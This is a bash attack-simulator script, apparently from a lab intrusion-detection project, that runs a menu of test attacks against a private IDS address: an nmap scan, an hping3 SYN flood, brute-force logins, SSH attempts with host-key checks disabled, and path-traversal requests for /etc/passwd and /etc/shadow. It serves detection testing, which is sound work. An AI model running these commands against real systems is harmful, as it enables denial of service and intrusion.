#!/bin/bash
# ============================================
# IDS Attack Simulator for Kali Linux
# Copy this file to Kali and run: ./kali-attacks.sh
# ============================================

# Change this to your IDS server IP
IDS_IP="192.168.100.4"

# Colors for output
RED='\033[0;31m'
GREEN='\033[0;32m'
YELLOW='\033[1;33m'
BLUE='\033[0;34m'
NC='\033[0m' # No Color

clear
echo -e "${BLUE}===========================================${NC}"
echo -e "${BLUE}   IDS Attack Simulator${NC}"
echo -e "${BLUE}   Target: ${RED}$IDS_IP${NC}"
echo -e "${BLUE}===========================================${NC}"
echo ""

# Check if target is reachable
echo -e "${YELLOW}[*] Checking connectivity...${NC}"
if ! ping -c 2 -W 2 $IDS_IP > /dev/null 2>&1; then
    echo -e "${RED}[-] ERROR: Cannot reach $IDS_IP${NC}"
    echo "    Please check the IP address"
    exit 1
fi
echo -e "${GREEN}[+] Target is reachable${NC}"
echo ""

# Function to show menu
show_menu() {
    echo -e "${BLUE}Select attack type:${NC}"
    echo "1) Port Scan (Probe)"
    echo "2) DoS Attack"
    echo "3) Brute Force"
    echo "4) R2L Attack"
    echo "5) U2R Attack"
    echo "6) Mixed/Unknown Attack"
    echo "7) Test ALL attacks"
    echo "8) Exit"
    echo ""
    read -p "Enter choice [1-8]: " choice
}

# Function to wait and show status
wait_for_detection() {
    echo -e "${YELLOW}    Waiting 5 seconds for detection...${NC}"
    sleep 5
    echo -e "${GREEN}    ✓ Check Monitoring: http://$IDS_IP:5173${NC}"
    echo ""
}

# Attack 1: Port Scan
attack_port_scan() {
    echo -e "${RED}[1] Port Scan Attack (Probe)${NC}"
    echo "    Scanning ports 1-500..."
    nmap -p 1-500 -T4 $IDS_IP > /dev/null 2>&1
    wait_for_detection
}

# Attack 2: DoS
attack_dos() {
    echo -e "${RED}[2] DoS Attack${NC}"
    echo "    Sending SYN flood (5 seconds)..."
    hping3 -S -p 5001 --flood $IDS_IP > /dev/null 2>&1 &
    HPING_PID=$!
    sleep 5
    kill $HPING_PID 2>/dev/null
    wait $HPING_PID 2>/dev/null
    wait_for_detection
}

# Attack 3: Brute Force
attack_brute_force() {
    echo -e "${RED}[3] Brute Force Attack${NC}"
    echo "    Sending 15 failed login attempts..."
    for i in {1..15}; do
        curl -s -X POST http://$IDS_IP:8080/login \
            -d "username=admin&password=wrongpass$i" \
            -H "Content-Type: application/x-www-form-urlencoded" \
            --max-time 2 > /dev/null 2>&1
        sleep 0.2
    done
    wait_for_detection
}

# Attack 4: R2L
attack_r2l() {
    echo -e "${RED}[4] R2L Attack (Remote to Local)${NC}"
    echo "    Attempting unauthorized SSH access..."
    for i in {1..8}; do
        ssh -o ConnectTimeout=1 \
            -o StrictHostKeyChecking=no \
            -o UserKnownHostsFile=/dev/null \
            fakeuser$i@$IDS_IP "exit" > /dev/null 2>&1
        sleep 0.5
    done
    wait_for_detection
}

# Attack 5: U2R
attack_u2r() {
    echo -e "${RED}[5] U2R Attack (User to Root)${NC}"
    echo "    Attempting directory traversal..."
    curl -s "http://$IDS_IP:8080/../../etc/passwd" --max-time 2 > /dev/null 2>&1
    curl -s "http://$IDS_IP:8080/../../etc/shadow" --max-time 2 > /dev/null 2>&1
    curl -s "http://$IDS_IP:8080/../../root" --max-time 2 > /dev/null 2>&1
    wait_for_detection
}

# Attack 6: Mixed
attack_mixed() {
    echo -e "${RED}[6] Mixed/Unknown Attack${NC}"
    echo "    Combining port scan + DoS..."
    nmap -p 1-200 -T4 $IDS_IP > /dev/null 2>&1 &
    hping3 -S -p 5001 -c 100 $IDS_IP > /dev/null 2>&1 &
    wait
    wait_for_detection
}

# Test all attacks
test_all() {
    echo -e "${RED}[7] Testing ALL Attacks${NC}"
    echo ""
    attack_port_scan
    attack_dos
    attack_brute_force
    attack_r2l
    attack_u2r
    attack_mixed
    echo -e "${GREEN}===========================================${NC}"
    echo -e "${GREEN}  All attacks completed!${NC}"
    echo -e "${GREEN}  Check: http://$IDS_IP:5173${NC}"
    echo -e "${GREEN}===========================================${NC}"
}

# Main loop
while true; do
    show_menu
    case $choice in
        1) attack_port_scan ;;
        2) attack_dos ;;
        3) attack_brute_force ;;
        4) attack_r2l ;;
        5) attack_u2r ;;
        6) attack_mixed ;;
        7) test_all ;;
        8) 
            echo -e "${YELLOW}Stopping any running attacks...${NC}"
            pkill nmap 2>/dev/null
            pkill hping3 2>/dev/null
            echo -e "${GREEN}Goodbye!${NC}"
            exit 0
            ;;
        *)
            echo -e "${RED}Invalid choice!${NC}"
            sleep 1
            ;;
    esac
    echo ""
    read -p "Press Enter to continue..."
    clear
done

